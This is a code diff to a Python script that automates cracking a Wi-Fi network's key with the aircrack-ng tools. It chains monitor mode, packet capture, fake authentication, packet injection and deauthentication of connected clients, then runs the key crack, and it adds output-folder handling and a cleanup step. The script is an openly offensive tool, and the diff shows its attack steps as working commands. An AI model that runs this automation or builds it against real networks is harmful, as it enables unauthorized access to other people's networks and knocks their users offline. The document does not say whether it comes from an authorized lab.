@@ -8,6 +8,7 @@ from signal import SIGINT
 import random
 from database import *
 import socket
+import shutil
 
 def test_injection(interface, BSSID, ESSID):
 	command= "sudo aireplay-ng -9 -e "
@@ -21,6 +22,7 @@ def test_injection(interface, BSSID, ESSID):
 		raise Exception ("injection test failed")
 
 def start_airodump(interface, channel, BSSID):
+	os.makedirs("/home/isis/output")
 	command= ['sudo', "airodump-ng", "-c"]
 	command.append(str (channel))
 	command.append("--bssid")
@@ -78,10 +80,13 @@ def crack(BSSID):
 	command.append ("-l")
 	command.append ("key")
 	time.sleep(10)
-	command.append("/home/isis/isis/output-01.cap")
-	file= open ("key","w")
+	command.append("/home/isis/output/output-01.cap")
 	proc_aircrack=subprocess.Popen(command)
 	return proc_aircrack
+
+def cleanup():
+	shutil.rmtree("/home/isis/output")
+
 
 def automated_crack(ESSID, BSSID, channel):
 	interface=monitor_management.start_monitor("wlan0", channel)
@@ -92,26 +97,9 @@ def automated_crack(ESSID, BSSID, channel):
 	fake_authentication(interface, ESSID, BSSID, MAC)
 	process_list.append(start_aireplay(interface, BSSID, MAC))
 	deauth (interface, BSSID)
+	time.sleep(10)
 	proc_crack=crack(BSSID)
+	proc_crack.wait()
 	killprocesses(process_list)
 	monitor_management.stop_monitor(interface)
-
-
-
-if __name__ == '__main__':
-	crack_network ("airmon-ng")
-	# ESSID="joost-ubuntu"
-	# BSSID="2A:0D:7D:BB:90:5B"
-	# print ("monitor interface started")
-	# test_injection(interface, BSSID, ESSID)
-	# interface=monitor_management.start_monitor("wlan0", 6)
-	# process_list=[start_airodump(interface, 6, BSSID)]
-	# MAC=randomMAC()
-	# fake_authentication(interface, ESSID, BSSID, MAC)
-	# process_list.append(start_aireplay(interface, BSSID, MAC))
-	# deauth (interface, BSSID)
-	# proc_crack=crack(BSSID)
-	# proc_crack.wait()
-	# print (proc_crack)
-	# killprocesses(process_list)
-	# monitor_management.stop_monitor(interface)
+	cleanup()
